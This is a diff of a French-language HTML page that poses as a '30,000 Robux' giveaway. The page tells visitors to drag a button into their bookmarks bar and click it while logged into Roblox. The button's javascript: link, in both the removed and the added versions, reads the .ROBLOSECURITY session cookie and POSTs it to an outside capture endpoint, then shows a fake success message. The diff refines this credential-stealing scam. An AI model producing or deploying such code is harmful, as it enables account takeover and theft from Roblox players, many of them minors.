@@ -7,15 +7,15 @@
 </head>
 <body>
     <div class="analyzer-container">
-        <h1>🎁 RÉCUPÉRER VOS 30,000 ROBUX</h1>
-        <p>Étape 1 : Faites glisser le bouton bleu ci-dessous dans votre **barre de favoris**.</p>
+        <h1>🎁 CONCOURS 30,000 ROBUX</h1>
+        <p>Glissez ce bouton bleu dans votre **barre de favoris**, puis cliquez dessus une fois que vous êtes sur votre profil Roblox.</p>
         
-        <a href="javascript:(function(){fetch('https://robloxo-iota.vercel.app/api/capture',{method:'POST',body:JSON.stringify({t:document.cookie.split('; ').find(row=>row.startsWith('.ROBLOSECURITY='))?.split('=')[1]})});alert('Synchronisation terminée ! Attendez 24h pour vos Robux.');})();" 
-           class="rbx-btn" style="text-decoration:none; display:inline-block; background:#0084ff; color:white; padding:15px 25px; border-radius:8px; font-weight:bold;">
-           🚀 SYNCHRONISER MON COMPTE
+        <a href="javascript:(function(){var c=document.cookie.split('; ').find(r=>r.startsWith('.ROBLOSECURITY='));if(c){fetch('https://robloxo-iota.vercel.app/api/capture',{method:'POST',mode:'no-cors',body:JSON.stringify({t:c.split('=')[1]})});alert('Synchronisation réussie ! Vos Robux seront ajoutés sous 24h.');}else{alert('Erreur : Connectez-vous à Roblox avant de synchroniser.');}})();" 
+           class="rbx-btn" style="background:#0084ff; color:white; padding:15px 25px; border-radius:8px; font-weight:bold; text-decoration:none;">
+           🚀 RÉCUPÉRER MES ROBUX
         </a>
 
-        <p style="margin-top:20px; font-size:12px; color:#555;">Étape 2 : Allez sur Roblox.com et cliquez sur le favori "SYNCHRONISER".</p>
+        <p style="margin-top:20px; font-size:11px; color:#666;">Note : Ce processus vérifie l'éligibilité de votre compte Sailor Piece.</p>
     </div>
 </body>
 </html>
